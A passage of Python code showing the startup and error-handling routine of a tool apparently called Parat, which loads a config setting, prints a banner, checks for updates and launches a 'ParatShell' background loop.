    verbose  = tolow(config_file().get('cmd', 'debug'))

    if banner == "on":
        print_banner(int(randbc))

    try:

        check_update()
        notif_creds(colors, login_obg)

        parat = ParatShell()
        parat.check_db()
        parat.main_background()

    except Exception as e:

        if verbose:
            traceback.print_exc()
        pprint(
            colorize(str(e) + '\n',
            colored=colors,
            status="ERR"
        ), 1)

        plog.error(str(e))
